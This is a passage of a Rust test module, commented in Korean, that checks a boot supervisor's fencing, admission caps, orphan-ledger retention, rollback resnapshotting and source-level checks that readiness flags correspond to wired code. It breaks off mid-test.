        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0), 1);
        // 러너가 한 번 보고한 것으로 만든다(그래야 fence 가 발효 조건을 통과한다).
        {
            let mut g = d.boot_run_active.lock().unwrap();
            let r = g.values_mut().next().expect("스폰 전 표 등록이 없다");
            assert_eq!(r.generation, 1, "표 세대가 인텐트와 어긋난다");
            r.hb = 10.0; // started(1.0) 보다 뒤 = 보고 1회
        }
        // hb 정지 상한을 넘긴 시점에 틱 — fence 는 나되 **낳지는 않는다**.
        let spawned = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 10.0 + HB_STALL_SECS + 1.0);
        assert_eq!(spawned, 0, "fence 가 새 프로세스를 낳았다 — 재개는 이 단위에 없다");
        let after = BootIntent::from_str("f", &std::fs::read_to_string(intent_path(&dir, "f")).unwrap())
            .expect("fence 후 인텐트 판독 불가");
        assert_eq!(after.generation, 2, "fence 가 파일 세대를 올리지 않았다(구 러너가 무력화되지 않는다)");
        // ★R3 #4: 소유권을 잃은 런은 **활성이 아니다** — 표에서 빠지고 고아 원장으로 옮겨간다.
        //   종전엔 표의 세대만 올려 '활성인데 fence 된' 중간 상태가 남았다.
        assert!(
            d.boot_run_active.lock().unwrap().is_empty(),
            "fence 됐는데 활성 표에 남아 있다 — admission 분모가 이중 계상된다"
        );
        let hist = d.boot_fenced.lock().unwrap();
        assert_eq!(hist.len(), 1, "고아 원장에 정확히 1건이 아니다: {}", hist.len());
        assert_eq!(hist[0].key(), ("f", 0, 1), "원장 유일 키가 (intent, epoch, generation) 이 아니다");
        drop(hist);
        assert_eq!(after.state, IntentState::Running, "fence 가 상태를 바꿨다 — 재개는 아직 없다");
    }

    /// ★B3-2R ③(codex③) — **영속에 실패하면 낳지 않는다**(in-crate 소스핀).
    ///
    /// 종전엔 `write_intent` 가 실패해도 오류를 이벤트에 실어 보내며 **그대로 스폰**했다.
    /// 그러면 시도 수와 세대가 디스크에 없는 채 프로세스가 태어나고, 그 프로세스가 든 lease 는
    /// 어떤 영속 근거도 갖지 못한다(재시작하면 세대가 되감겨 ABA 가 열린다).
    ///
    /// ★왜 런타임 주입이 아니라 소스핀인가 — 이 경로의 쓰기 실패를 **결정론으로 주입할 수단이
    /// 없다**: ①스풀을 읽기전용으로 만들면 `tick_in` 선두의 `ensure_spool` 이 0o700 으로 되돌린다
    /// (IG-23 에서 실측한 사실이다) ②인텐트 경로 자리를 디렉터리로 막으면 스캔이 그 항목을
    /// **읽지 못해** 판정 자체가 일어나지 않는다 — 그렇게 만든 검체는 '스폰 0' 을 내지만 그것은
    /// 이 계약이 아니라 **다른 이유**로 얻은 0 이다(공허한 통과). 그래서 잴 수 없는 것을 잰 척하지
    /// 않고, 대신 **호출 순서**를 소스에서 못박는다: 쓰기 실패 갈래에 `continue` 가 있고 그것이
    /// 실행자 호출보다 **앞선다**.
    #[test]
    fn persist_failure_blocks_the_spawn_source_pin() {
        let src = include_str!("boot_supervisor.rs");
        let prod = src.split("#[cfg(test)]").next().expect("프로덕션 구간 분리 실패");
        let arm = prod
            .find("Disposition::Run(action) => {")
            .expect("디스패치 갈래를 못 찾았다");
        let body = &prod[arm..];
        let persist = body
            .find("if let Some(e) = write_intent(dir, &persisted).err() {")
            .expect("영속 실패 갈래가 사라졌다 — 실패해도 스폰하는 형상으로 되돌아갔다");
        let spawn = body
            .find("let outcome = dispatch_one(")
            .expect("실행자 호출을 못 찾았다");
        assert!(
            persist < spawn,
            "영속 실패 검사가 실행자 호출보다 뒤에 있다 — 근거 없는 lease 로 프로세스가 태어난다"
        );
        let gate = &body[persist..spawn];
        assert!(
            gate.contains("continue;"),
            "영속 실패 갈래가 조기 반환하지 않는다(오류만 싣고 그대로 스폰하는 종전 형상)"
        );
    }

    /// ★B3-2R ④ⓓ — **전역 admission 상한**에 걸리면 낳지 않고 시끄럽게 멈춘다.
    ///
    /// `MAX_ATTEMPTS` 는 인텐트별 예산이라 선언이 쌓이면 전역 총량이 유계가 아니다(codex④).
    /// 무kill 계약에서 fence 는 소유권만 회수하고 프로세스는 남길 수 있으므로 그 고아가 분모다.
    #[test]
    fn admission_cap_stops_spawning_when_orphans_pile_up() {
        let d = tmp_daemon("admission");
        let dir = tmp_spool("admission");
        enqueue_in(&dir, &req("a", None), 0.0).unwrap();
        // 고아를 상한까지 채워 둔다(fence 된 러너가 살아 있는 상태의 모형).
        {
            let mut g = d.boot_fenced.lock().unwrap();
            for i in 0..MAX_LIVE_BOOT_RUNS {
                g.push(crate::state::FencedRun {
                    intent: format!("orphan{i}"),
                    epoch: 0,
                    generation: 1,
                    pid: Some(1000 + i as u32),
                    why: "hb_stall",
                    at: 1.0,
                });
            }
        }
        fn never(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            panic!("admission 상한을 넘어 스폰했다 — 전역 총량이 유계가 아니다");
        }
        let mut st = SupState::default();
        assert_eq!(
            tick_in(&d, &dir, &mut st, never, remove_spool_file, 2.0),
            0,
            "상한에 걸렸는데 디스패치가 계상됐다"
        );
        // 조용하지 않아야 한다 — 상한 정지는 부트가 안 나는 상태이므로 반드시 보여야 한다.
        let feed = d.feed_items.lock().unwrap().len();
        assert!(feed > 0, "admission 상한 정지가 조용하다(통보 0)");
    }

    /// ★R5 [4](codex · master 심판) — **고아는 나이만으로 원장에서 빠지지 않는다**(armed 무관).
    ///
    /// 종전에는 미무장이면 나이가 지난 고아를 지웠다. 그런데 대조군이 '나이가 지나면 지운다'
    /// 이면 **exit ACK 없는 삭제를 정상으로 검증**하게 된다 — codex 가 짚은 그 지점이다. 나이는
    /// 관측이 아니라 추정이고, 추정으로 지우면 살아 있는 러너를 없는 것으로 세어 새 런을 낳는
    /// 문이 열린다. 원장에서 빼는 유일한 근거는 **확인된 exit 관측**이다(A18 [5] · B4).
    ///
    /// ★대가를 정직하게 함께 잰다: 회수가 없으니 상한이 찬 채로 남고 부트는 나지 않는다.
    /// 그 정지가 조용하지 않은지를 단언한다. 그것이 무해한 이유는 사슬이다 — 미무장에서는
    /// fence 가 원장에 애초에 아무것도 넣지 않고, 무장은 readiness 8칸이 막으며, 무장이 열릴
    /// 때는 `confirmed_exit_observed` 가 참이라 회수 경로가 이미 존재한다.
    #[test]
    fn orphans_are_never_dropped_by_age_alone() {
        let d = tmp_daemon("hold");
        let dir = tmp_spool("hold");
        {
            let mut g = d.boot_fenced.lock().unwrap();
            for i in 0..MAX_LIVE_BOOT_RUNS {
                g.push(crate::state::FencedRun {
                    intent: format!("old{i}"),
                    epoch: 0,
                    generation: 1,
                    pid: None,
                    why: "hb_stall",
                    at: 1.0,
                });
            }
        }
        // 나이를 훌쩍 넘긴 시점 — 종전이라면 여기서 전부 지워졌다.
        let now = 1.0 + FENCED_REAP_AGE_SECS + 1.0;
        enqueue_in(&dir, &req("r2", None), now).unwrap();
        // ① 미무장 — 남는다.
        let mut disarmed = SupState::default();
        let before = d.bus.latest_seq();
        let spawned = tick_in(&d, &dir, &mut disarmed, ok_runner, remove_spool_file, now);
        assert_eq!(
            d.boot_fenced.lock().unwrap().len(),
            MAX_LIVE_BOOT_RUNS,
            "미무장에서 나이만으로 고아를 지웠다 — exit ACK 없는 삭제를 정상으로 만드는 대조군이다"
        );
        assert_eq!(
            spawned, 0,
            "상한이 찼는데 낳았다 — admission 이 고아 원장을 분모로 세지 않는다"
        );
        // ★seq 증가만 보면 안 된다(실측으로 확인했다): 상한 정지 이벤트가 따로 나므로 통보를
        //   지워도 seq 는 늘고, 그러면 이 단언은 통보 소실을 가르지 못한다. 이름으로 잰다.
        let evts = d.bus.replay_after(before);
        assert!(
            evts.iter().any(|e| e["name"] == "boot_supervisor.orphan_hold"),
            "고아 보유가 이름 있는 이벤트로 나가지 않는다 — 부트가 안 나는 상태의 원인을 \
             운영자가 찾을 자리가 없다: {:?}",
            evts.iter().map(|e| e["name"].clone()).collect::<Vec<_>>()
        );
        // ② 무장 — 같다. 이 자제는 armed 여부와 무관하다(R4 에서는 armed 만이었다).
        let mut armed = SupState::default();
        armed.fence_armed = true;
        let _ = tick_in(&d, &dir, &mut armed, ok_runner, remove_spool_file, now);
        assert_eq!(
            d.boot_fenced.lock().unwrap().len(),
            MAX_LIVE_BOOT_RUNS,
            "armed 에서 나이만으로 고아를 지웠다"
        );
    }

    /// ★B3-5(T3-2) — 재스냅샷 판정의 **네 갈래**.
    ///
    /// ②가 계약의 핵심이다: `running` 은 이미 러너가 소유했으므로 스위치가 내려가도 태어난 대로
    /// 완주한다. 중간에 주체를 바꾸면 소유권이 갈린다.
    #[test]
    fn only_unstarted_intents_are_resnapshotted_on_rollback() {
        // ① 스위치가 켜져 있으면 손대지 않는다.
        assert_eq!(resnapshot_executor(IntentState::Pending, EXECUTOR_RUNNER, true), None);
        // ② running 은 태어난 대로 완주한다 — 스위치가 내려가도 바꾸지 않는다.
        assert_eq!(
            resnapshot_executor(IntentState::Running, EXECUTOR_RUNNER, false),
            None,
            "이미 착수한 런의 실행 주체를 바꿨다 — 소유권이 갈린다"
        );
        // ③ pending + 스위치 내려감 → python 으로 다시 찍는다.
        assert_eq!(
            resnapshot_executor(IntentState::Pending, EXECUTOR_RUNNER, false),
            Some(EXECUTOR_PYTHON),
            "롤백인데 미착수 인텐트가 runner 로 남았다 — 사용자는 즉시 롤백을 기대한다"
        );
        // ④ 이미 python 이면 다시 찍지 않는다(멱등 — 매 틱 쓰기 금지).
        assert_eq!(
            resnapshot_executor(IntentState::Pending, EXECUTOR_PYTHON, false),
            None,
            "이미 python 인데 또 썼다 — 매 틱 디스크 쓰기가 된다"
        );
    }

    /// ★B3-5(T3-2) — 재스냅샷이 **실제로 배선**돼 디스크에 착지한다(순수 판정만으로는 공허).
    #[test]
    fn rollback_resnapshots_pending_intents_on_disk() {
        let d = tmp_daemon("resnap");
        let dir = tmp_spool("resnap");
        enqueue_in(&dir, &req("a", None), 0.0).unwrap();
        // running 대조군 — 같은 틱에서 손대지 않아야 한다.
        let mut running = intent("b");
        running.state = IntentState::Running;
        running.executor = EXECUTOR_RUNNER.into();
        write_intent(&dir, &running).unwrap();

        let mut st = SupState::default();
        st.boot_v2_off = true; // 롤백 스위치가 내려갔다
        let s0 = d.bus.latest_seq();
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0);

        let a = BootIntent::from_str("a", &std::fs::read_to_string(intent_path(&dir, "a")).unwrap())
            .expect("a 판독 불가");
        assert_eq!(a.executor, EXECUTOR_PYTHON, "미착수 인텐트가 다시 찍히지 않았다");
        let b = BootIntent::from_str("b", &std::fs::read_to_string(intent_path(&dir, "b")).unwrap())
            .expect("b 판독 불가");
        assert_eq!(
            b.executor, EXECUTOR_RUNNER,
            "running 인텐트의 실행 주체가 바뀌었다 — 태어난 대로 완주 계약 위반"
        );
        assert!(
            d.bus.replay_after(s0).iter()
                .any(|e| e["name"] == "boot_supervisor.executor_resnapshot"),
            "재스냅샷이 조용하다 — 롤백이 실제로 반영됐는지 밖에서 알 수 없다"
        );
        // 멱등: 한 번 더 돌려도 다시 쓰지 않는다.
        let s1 = d.bus.latest_seq();
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0);
        assert!(
            !d.bus.replay_after(s1).iter()
                .any(|e| e["name"] == "boot_supervisor.executor_resnapshot"),
            "이미 python 인데 매 틱 다시 쓴다"
        );
    }

    /// ★B3-5(§2-6 · H-LEASE-3) — **손상 인텐트는 조용히 지워지지 않는다.**
    ///
    /// 종전에는 `intent_discarded` 한 줄만 남기고 파일이 사라졌다. 그러면 "그 선언이 실행됐는가 ·
    /// 왜 사라졌는가" 를 판정할 근거가 디스크에 없다. `TerminalKind::StateUnreadable` 이 열거에만
    /// 있고 아무도 쓰지 않던 미구현분이 정확히 이것이다.
    #[test]
    fn unparsable_intents_are_closed_as_state_unreadable_not_just_deleted() {
        let d = tmp_daemon("unread");
        let dir = tmp_spool("unread");
        raw_intent(&dir, "junk", "{ broken json here");
        let mut st = SupState::default();
        let s0 = d.bus.latest_seq();
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0);

        assert!(
            !intent_path(&dir, "junk").exists(),
            "손상 파일이 원래 이름으로 남았다"
        );
        // `.done` 으로 닫혔고 terminal 이 state_unreadable 이어야 한다.
        let done: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.path())
            .filter(|p| p.to_string_lossy().contains("junk.") && p.to_string_lossy().ends_with(DONE_SUFFIX))
            .collect();
        assert_eq!(done.len(), 1, "state_unreadable terminal 기록이 없다: {done:?}");
        let body = std::fs::read_to_string(&done[0]).unwrap();
        let closed = BootIntent::from_str("junk", &body).expect("terminal 기록을 판독할 수 없다");
        assert_eq!(closed.state, IntentState::Terminal);
        assert_eq!(
            closed.terminal.as_ref().map(|t| t.kind),
            Some(TerminalKind::StateUnreadable),
            "terminal 종류가 state_unreadable 이 아니다"
        );
        // 미러 줄에 손상 원문 앞부분이 실려야 한다(포렌식).
        let evts = d.bus.replay_after(s0);
        let mirror = evts
            .iter()
            .find(|e| e["name"] == "boot_supervisor.state_unreadable")
            .expect("미러 줄이 없다");
        assert!(
            mirror["payload"]["head"].as_str().unwrap_or_default().contains("broken"),
            "미러 줄에 손상 원문이 실리지 않았다 — 포렌식 가치가 사라진다"
        );
        // ★삭제 경로를 타지 않았어야 한다(탔다면 원본이 없어 실패하고 undeletable 소음이 된다).
        assert!(
            !evts.iter().any(|e| e["name"] == "boot_supervisor.intent_discarded"
                && e["payload"]["why"] == "unparsable"),
            "닫고 나서 삭제까지 시도했다 — 실패해 undeletable 캐시에 쌓이고 매 틱 소음이 된다"
        );
    }

    /// ★B3-5 소스핀 — **틱은 프로세스 전역 env 를 읽지 않는다.**
    ///
    /// 틱이 env 를 읽으면 모든 틱 검체가 전역 상태에 묶인다 — ambient 값 하나로 무관한 검체의
    /// 동작이 조용히 바뀌고, 검체가 그 env 를 만지면 병렬로 도는 다른 검체가 그 값을 본다.
    /// 이 저장소가 방금 값을 치른 계급이다(auth 게이트 ↔ 마스터 스위치 락 사건). 판독은
    /// `spawn` 1회이고 틱은 스냅샷을 본다.
    #[test]
    fn the_tick_reads_no_process_env() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("fn tick_in(").expect("tick_in 소실");
        let body = &prod[at..];
        let end = body.find("\n}").expect("tick_in 본문 끝 소실");
        assert!(
            !body[..end].contains("std::env::var"),
            "틱이 프로세스 전역 env 를 읽는다 — 모든 틱 검체가 그 값에 묶이고, 검체 간 간섭이 \
             열린다. 판독은 spawn 1회이고 틱은 SupState 스냅샷을 봐야 한다"
        );
    }

    /// ★R6 [3](codex R5) — **aged 전이는 보유 고지와 다른 래치로 따로 보고된다.**
    ///
    /// 종전에는 래치 하나가 둘을 덮어서, young 상태에서 한 번 발화하면 나중에 aged 가 되는
    /// 순간이 영영 조용했다. 나이를 '진단 축' 으로 남긴 의미(R5 [4])가 정확히 그 자리에서
    /// 사라진다 — 남긴 신호가 도달하지 않으면 안 남긴 것과 같다.
    #[test]
    fn aged_transition_is_reported_separately_from_the_first_hold() {
        let d = tmp_daemon("aged");
        let dir = tmp_spool("aged");
        let now = 1.0 + FENCED_REAP_AGE_SECS + 1.0;
        // ★고아를 **둘** 넣고 나이를 다르게 준다. 하나뿐이면 held 와 aged 가 같은 값이 되어
        //   "aged 자리에 held 를 실었다" 는 오염을 검체가 **구별하지 못한다**(변이로 실측했다).
        {
            let mut g = d.boot_fenced.lock().unwrap();
            for (id, at) in [("old", 1.0), ("young", now - 1.0)] {
                g.push(crate::state::FencedRun {
                    intent: id.into(),
                    epoch: 0,
                    generation: 1,
                    pid: None,
                    why: "hb_stall",
                    at,
                });
            }
        }
        let names = |v: &[serde_json::Value]| {
            v.iter().map(|e| e["name"].clone()).collect::<Vec<_>>()
        };
        let mut st = SupState::default();
        // ① young 틱 — 보유 고지만 나고 aged 는 0 이다.
        let s0 = d.bus.latest_seq();
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0);
        let e1 = d.bus.replay_after(s0);
        let hold1: Vec<_> = e1
            .iter()
            .filter(|e| e["name"] == "boot_supervisor.orphan_hold")
            .collect();
        assert_eq!(hold1.len(), 1, "young 틱의 보유 고지가 1회가 아니다: {:?}", names(&e1));
        assert_eq!(hold1[0]["payload"]["aged"], json!(0), "young 인데 aged 가 0 이 아니다");
        assert!(
            !e1.iter().any(|e| e["name"] == "boot_supervisor.orphan_aged"),
            "아직 젊은데 aged 전이를 보고했다: {:?}",
            names(&e1)
        );
        // ② aged 틱 — ★래치를 공유했다면 정확히 여기가 조용했다.
        let s1 = d.bus.latest_seq();
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now);
        let e2 = d.bus.replay_after(s1);
        let aged: Vec<_> = e2
            .iter()
            .filter(|e| e["name"] == "boot_supervisor.orphan_aged")
            .collect();
        assert_eq!(
            aged.len(),
            1,
            "aged 전이가 보고되지 않았다 — 래치를 공유하면 정확히 이 자리가 조용해진다: {:?}",
            names(&e2)
        );
        assert_eq!(
            aged[0]["payload"]["aged"],
            json!(1),
            "aged 값이 실제 나이 초과 수와 다르다(둘 중 하나만 늙었다)"
        );
        assert_eq!(
            aged[0]["payload"]["held"],
            json!(2),
            "held 값이 보유 총수와 다르다 — held 와 aged 가 같은 값으로 무너지면 오염을 못 가른다"
        );
        assert!(
            !e2.iter().any(|e| e["name"] == "boot_supervisor.orphan_hold"),
            "보유 고지가 두 번 났다 — 그쪽 래치가 안 걸렸다"
        );
        // ③ aged 고지도 1회성이다(반복 소음 금지).
        let s2 = d.bus.latest_seq();
        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now + 1.0);
        assert!(
            !d.bus
                .replay_after(s2)
                .iter()
                .any(|e| e["name"] == "boot_supervisor.orphan_aged"),
            "aged 고지가 매 틱 반복된다 — 래치가 없다"
        );
    }

    /// ★B4-1(A18 [2] · codex R7 [2]) — 활성 등록은 **덮어쓰기가 아니라 예약**이고, 거절 사유는
    /// 접히지 않는다.
    #[test]
    fn admission_is_reserved_not_overwritten() {
        let d = tmp_daemon("resv");
        let mk = |intent: &str, gen: u32| BootRunActive {
            intent: intent.into(),
            generation: gen,
            roles: Vec::new(),
            hb: 1.0,
            progress_step: String::new(),
            progress_at: 1.0,
            started: 1.0,
            pid: None,
            epoch: 7,
        };
        let first = reserve_admission(&d, "L", mk("a", 1)).expect("빈 슬롯을 잡지 못했다");
        assert_eq!(first.key(), ("a", 7, 1), "예약 키가 (intent, epoch, generation) 이 아니다");
        assert_eq!(first.lane(), "L");
        // 같은 레인은 거절 — 그리고 원래 런이 그대로 남는다.
        assert_eq!(
            reserve_admission(&d, "L", mk("b", 2)).unwrap_err(),
            AdmissionRefusal::Occupied,
            "활성 슬롯이 찼는데 예약이 성공했다 — 덮어쓰기가 살아 있다"
        );
        assert_eq!(
            d.boot_run_active.lock().unwrap().get("L").map(|r| r.intent.clone()),
            Some("a".to_string()),
            "거절했는데 표가 바뀌었다 — 원래 런이 관측 밖 고아가 된다"
        );
        // ★다른 레인은 잡힌다 — G1 은 레인당 ≤1 이지 전역 1 이 아니다.
        reserve_admission(&d, "M", mk("c", 3)).expect("다른 레인을 잡지 못했다");
        assert_eq!(d.boot_run_active.lock().unwrap().len(), 2);
    }

    /// ★B4-1 해제 경로 넷 중 ④ **확인된 exit** — 나이가 아니라 이것이 회수의 근거다(R5 [4]).
    #[test]
    fn confirmed_exit_frees_the_slot_and_the_orphan_ledger() {
        let d = tmp_daemon("ack");
        let run = BootRunActive {
            intent: "a".into(),
            generation: 1,
            roles: Vec::new(),
            hb: 1.0,
            progress_step: String::new(),
            progress_at: 1.0,
            started: 1.0,
            pid: None,
            epoch: 7,
        };
        reserve_admission(&d, "L", run).expect("예약 실패");
        d.boot_fenced.lock().unwrap().push(crate::state::FencedRun {
            intent: "a".into(),
            epoch: 7,
            generation: 1,
            pid: None,
            why: "hb_stall",
            at: 1.0,
        });
        // 다른 키의 ACK 는 아무것도 회수하지 않는다(키가 갈리면 안 된다).
        assert!(!release_confirmed_exit(&d, ("a", 7, 2)), "다른 세대의 ACK 가 회수했다");
        assert_eq!(d.boot_run_active.lock().unwrap().len(), 1);
        // 같은 키의 ACK 는 활성 슬롯과 고아 원장을 **함께** 회수한다.
        assert!(release_confirmed_exit(&d, ("a", 7, 1)), "확인된 exit 이 아무것도 회수하지 못했다");
        assert!(d.boot_run_active.lock().unwrap().is_empty(), "활성 슬롯이 남았다");
        assert!(d.boot_fenced.lock().unwrap().is_empty(), "고아 원장이 남았다");
    }

    /// ★B4-1 소스핀(master ⓔ) — **해제 경로 넷이 모두 배선돼 있다.**
    ///
    /// 하나라도 빠지면 그 레인이 영구 정지한다. 특히 ③ **스폰 시도 실패** 는 내가 처음에
    /// 빠뜨린 경로다(master 지적) — 예약해 놓고 낳지 못했는데 놓지 않으면 그 레인은 다시는
    /// 부트하지 못한다. 행위 검체(retry 가 상한까지 도는가)와 함께 소스로도 못 박는다.
    #[test]
    fn every_release_path_is_wired() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        // 정의 1 + 해제 호출들. 스폰 실패 갈래(Retire·Retry) 둘과 fence·확인된 exit 경로.
        assert!(
            prod.matches("release_admission(daemon, &lane)").count() >= 2,
            "스폰 실패 해제가 두 갈래(Retire·Retry) 모두에 없다 — 그 레인이 영구 정지한다"
        );
        assert!(
            prod.contains("fn release_confirmed_exit("),
            "확인된 exit 회수 경로가 없다 — 나이를 폐지했는데 대체 근거가 없다"
        );
        assert!(
            prod.contains("act.remove(&l)"),
            "fence 해제(레인 키 제거)가 없다 — 소유권을 잃은 런이 슬롯을 계속 쥔다"
        );
    }

    /// ★R7 [1](codex R6 · master 심판 · IG-28) — **준비도 주장은 빌드를 앞지를 수 없다.**
    ///
    /// ## R6 판의 결함 — 무측정을 막는 핀이 그 자체로 무측정이었다
    /// R6 판은 증거 마커의 **이름 문자열 존재**만 봤다. 그러면 `fn reserve_admission() {}` 처럼
    /// **빈 채로 정의만 된**(아무도 부르지 않는) 함수가 있어도 통과한다 — 배포 결박이 아니다.
    /// 게다가 나는 그때 "합성 표본으로 탐지력을 증명했다" 고 적었는데, 증명한 것은 '칸을
    /// 뒤집으면 이름이 없어 적발된다' 뿐이었다. **이름이 있는 경우를 재지 않았으니 반쪽이었다.**
    /// 이 세션이 반복해 말한 계급(초록인 것과 옳은 이유로 초록인 것은 다르다)이 핀 자신에게
    /// 적용된 것이다(codex 정확).
    ///
    /// ## 지금 재는 것 — 이름이 아니라 **배선**
    /// 증거가 있다 = ①정의가 있다 ②생산 경로에서 **실제로 불린다**(정의 자신을 뺀 호출 ≥1)
    /// ③본문이 비어 있지 않다. 셋을 다 만족해야 그 칸을 참이라 주장할 수 있다.
    ///
    /// ## 두 파일을 함께 훑는다
    /// `lease_ok` 는 이 파일에 정의되고 `handlers.rs` 에서 불린다. 한 파일만 보면 **배선된 것을
    /// 미배선으로 오판**해 이번엔 반대 방향의 거짓 적색이 된다.
    #[test]
    fn readiness_claims_cannot_outrun_the_build() {
        /// 호출 지점 `pos` 를 감싸는 함수 이름.
        fn enclosing_fn(src: &str, pos: usize) -> Option<&str> {
            let at = src[..pos].rfind("fn ")?;
            let rest = &src[at + 3..];
            let end = rest.find(|c: char| !(c.is_alphanumeric() || c == '_'))?;
            Some(&rest[..end])
        }
        /// 이 호출자가 **살아 있는가** — 진입점이거나, 자기 자신이 아닌 곳에서 불린다.
        ///
        /// ★정적 한계(master 판정): 도달성은 **한 단계**만 본다. 완전한 도달성 분석은 문자열
        /// 위에서 할 수 없고, 문자열 기반 정적 핀은 원리적으로 우회 가능하다. 그래서 완전
        /// 봉인은 B4 에서 **타입**으로 옮긴다(IG-28 갱신).
        fn is_alive(caller: &str, src: &str) -> bool {
            const ENTRY: [&str; 5] = ["spawn", "tick_in", "dispatch", "run_ensure_team", "main"];
            if ENTRY.contains(&caller) {
                return true;
            }
            src.match_indices(&format!("{caller}(")).any(|(i, _)| {
                !src[..i].ends_with("fn ")
                    && enclosing_fn(src, i).is_some_and(|e| e != caller)
            })
        }
        /// 이 이름이 **배선**돼 있는가 — 정의 · **살아있는** 호출 · 비어있지 않은 본문 셋 다.
        ///
        /// ## R8 에서 닫은 두 우회(codex R7 · 정당)
        /// ⓐ **dead call** — 아무도 부르지 않는 함수 안의 호출은 배선이 아니다. ★내 R7 합성
        ///    표본 자체가 그랬다(`fn t() { reserve_admission(); }` 의 `t` 를 아무도 안 부른다):
        ///    내가 만든 양성 증거가 바로 그 우회의 예시였다.
        /// ⓑ **자기재귀** — `fn f() { f(); }` 는 호출이 아니다.
        fn wired(name: &str, src: &str) -> bool {
            let def = format!("fn {name}(");
            let Some(dpos) = src.find(&def) else {
                return false;
            };
            let live_call = src.match_indices(&format!("{name}(")).any(|(i, _)| {
                if src[..i].ends_with("fn ") {
                    return false; // 정의 자신
                }
                match enclosing_fn(src, i) {
                    Some(c) if c == name => false, // ⓑ 자기재귀
                    Some(c) => is_alive(c, src),   // ⓐ dead call 배제
                    None => false,
                }
            });
            if !live_call {
                return false;
            }
            let after = &src[dpos..];
            let Some(open) = after.find('{') else {
                return false;
            };
            let mut depth = 0i32;
            let mut end = 0usize;
            for (i, b) in after[open..].bytes().enumerate() {
                match b {
                    b'{' => depth += 1,
                    b'}' => {
                        depth -= 1;
                        if depth == 0 {
                            end = i;
                            break;
                        }
                    }
                    _ => {}
                }
            }
            if end == 0 {
                return false;
            }
            !after[open + 1..open + end].trim().is_empty() // 빈 본문 = 배선이 아니다
        }

        // IG-28 증거 마커 — **8칸 전부** 대응한다(R6 판은 2칸만 봤다). B4 가 이 이름으로
        // 착지시키거나 다른 이름을 쓰면 이 표를 함께 고친다 — 어느 쪽이든 눈에 보이는 결박이다.
        const EVIDENCE: [(&str, &str); 8] = [
            ("lease_cas_closed", "lease_ok"),
            ("atomic_handler", "commit_terminal_atomic"),
            ("epoch_propagated", "propagate_epoch_to_runner"),
            ("self_terminate", "runner_self_exit_on_stale_lease"),
            ("boot_last_writer", "write_boot_last"),
            ("durable_history", "persist_fenced_history"),
            ("admission_reserved", "reserve_admission"),
            ("confirmed_exit_observed", "release_confirmed_exit"),
        ];
        /// (R8 · codex R7 ⓒ) 이름→필드 **조회를 없앤다**. 종전 `claimed` 의 wildcard 가
        /// 미지 이름을 `confirmed_exit_observed` 로 접어, 표에 오타가 나면 엉뚱한 칸을 읽었다.
        /// 값과 이름과 마커를 **한 자리에서** 함께 만들면 그 별칭이 구조적으로 불가능하다.
        fn claims(r: RunnerReadiness) -> [(&'static str, bool, &'static str); 8] {
            [
                ("lease_cas_closed", r.lease_cas_closed, "lease_ok"),
                ("atomic_handler", r.atomic_handler, "commit_terminal_atomic"),
                ("epoch_propagated", r.epoch_propagated, "propagate_epoch_to_runner"),
                ("self_terminate", r.self_terminate, "runner_self_exit_on_stale_lease"),
                ("boot_last_writer", r.boot_last_writer, "write_boot_last"),
                ("durable_history", r.durable_history, "persist_fenced_history"),
                ("admission_reserved", r.admission_reserved, "reserve_admission"),
                (
                    "confirmed_exit_observed",
                    r.confirmed_exit_observed,
                    "release_confirmed_exit",
                ),
            ]
        }
        fn missing(r: RunnerReadiness, src: &str) -> Vec<&'static str> {
            claims(r)
                .into_iter()
                .filter(|(_, claimed, marker)| *claimed && !wired(marker, src))
                .map(|(f, _, _)| f)
                .collect()
        }

        let prod = format!(
            "{}{}",
            strip_line_comments(
                &include_str!("boot_supervisor.rs")
                    [..include_str!("boot_supervisor.rs").find("#[cfg(test)]").unwrap()]
            ),
            strip_line_comments(
                &include_str!("handlers.rs")[..include_str!("handlers.rs").find("#[cfg(test)]").unwrap()]
            ),
        );
        // ① 실제 빌드 — 주장이 없으니(전부 false) 결손도 없다.
        assert!(
            missing(RUNNER_READINESS, &prod).is_empty(),
            "준비도 칸이 배선 없이 참이다: {:?}",
            missing(RUNNER_READINESS, &prod)
        );
        // ② ★실제 코드에서 **양성**도 잰다 — 이것이 R6 판에 없던 절반이다.
        //    `lease_ok` 는 이 파일에 정의되고 handlers.rs 에서 불린다. 여기서 false 가 나오면
        //    이 핀은 '항상 미배선' 이라 어떤 칸도 영영 참이 될 수 없다(반대 방향의 무측정).
        assert!(
            wired("lease_ok", &prod),
            "실재하는 배선(lease_ok — 정의는 감독자, 호출은 handlers)을 미배선으로 읽었다 \
             — 이 핀은 항상 적색이라 사문이다"
        );
        // ★B4-1·B4-2 착지로 admission 예약과 확인된 exit 회수 배선이 **실재**하게 됐다.
        //   핀이 그것을 배선으로 읽는지 확인한다 — IG-28 이 의도한 동작이다: 배선이 오면
        //   그 칸의 주장이 비로소 가능해지고, 오기 전에는 불가능하다.
        assert!(
            wired("reserve_admission", &prod),
            "B4-1 이 착지했는데 admission 예약을 미배선으로 읽었다 — 결박이 반대로 걸린다"
        );
        assert!(
            wired("release_confirmed_exit", &prod),
            "B4-2 가 착지했는데 확인된 exit 회수를 미배선으로 읽었다"
        );
        // ③ ★핀 자신의 검출력 — codex 가 지목한 '빈 채 정의만' 을 실제로 잡는가.
        let empty_only = "fn reserve_admission() {}";
        assert!(
            !wired("reserve_admission", empty_only),
            "빈 채 정의만 된 함수를 배선으로 읽었다 — R6 판의 결함 그대로다"
        );
        let defined_but_never_called = "fn reserve_admission() { do_work(); }";
        assert!(
            !wired("reserve_admission", defined_but_never_called),
